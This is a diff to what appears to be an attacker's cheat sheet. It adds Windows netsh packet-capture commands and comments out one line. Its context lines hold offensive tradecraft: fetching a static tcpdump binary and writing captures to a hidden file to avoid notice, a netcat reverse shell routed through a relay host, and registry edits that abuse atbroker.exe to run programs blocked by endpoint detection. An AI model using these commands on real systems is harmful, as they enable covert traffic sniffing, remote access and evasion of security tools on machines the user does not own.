@@ -8,6 +8,10 @@
 wget -q https://raw.githubusercontent.com/yunchih/static-binaries/master/tcpdump -O tcpdump && chmod +x tcpdump
 ./tcpdump -D
 ./tcpdump -n -i eth0 -s 0 -w .packets.pcap #. - hidden file, slightly less obvious
+
+#windows - no packet capture utilities installed? built in tools can be used like netsh
+netsh trace start capture=yes maxsize=1000 tracefile=<capture>.etl
+netsh trace stop
 =======================================================================
 
 -- # MSF #--
@@ -44,8 +48,13 @@ nc <relayip> <relayport>
 #routing reverse shell through relay host
 
 --# LOL #--
-using tools such as ATbroker in Win can be a way to execute programs blocked by EDR
+#using tools such as ATbroker in Win can be a way to execute programs blocked by EDR
 reg add "HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Accessibility\ATs\<exe>"
 reg add "HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Accessibility\ATs\<exe>" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0
 reg add "HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Accessibility\ATs\<exe>" /v StartExe /t REG_SZ /d c:\\<path>\\<exe>
 #create registry key for exe and add two entries to invoke the exe through atbroker.exe, which is a trusted Win utility
+
+#netsh for packet capture
+netsh trace start capture=yes maxsize=1000 tracefile=<capture>.etl
+netsh trace stop
+
